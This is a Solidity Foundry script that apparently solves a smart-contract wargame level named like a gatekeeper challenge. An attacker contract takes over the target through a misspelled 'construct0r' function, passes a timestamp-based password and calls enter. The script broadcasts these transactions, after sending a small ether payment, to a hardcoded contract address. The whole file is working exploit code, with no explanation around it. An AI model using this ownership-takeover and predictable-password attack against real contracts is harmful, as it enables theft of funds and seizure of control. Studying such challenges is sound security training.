// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "forge-std/Test.sol";

interface ITarget {
  function getAllowance(uint256 password) external;

  function createTrick() external;

  function enter() external;

  function allowEntrance() external view returns (bool);

  function construct0r() external;

  function entrant() external view returns (address);

  function trick() external view returns (address);
}

contract Hack {
  function solve(ITarget t) external {
    t.createTrick();
    t.getAllowance(block.timestamp);
    t.construct0r();
    require(t.allowEntrance(), "Gate two failed");
    t.enter();
    console.log("Entrant: %s", t.entrant());
  }
}

contract Solve is Script, Test {
  address target = address(0xF84e7abc9cC759Ae227Dd9437bEa3C7244cC36C3);

  function run() public {
    vm.startBroadcast();

    console.log("Block timestamp: %s", block.timestamp);
    ITarget t = ITarget(target);
    emit log_named_decimal_uint("Balance", target.balance, 18);
    payable(target).transfer(0.00101 ether);

    Hack h = new Hack();
    h.solve(t);

    vm.stopBroadcast();
  }
}
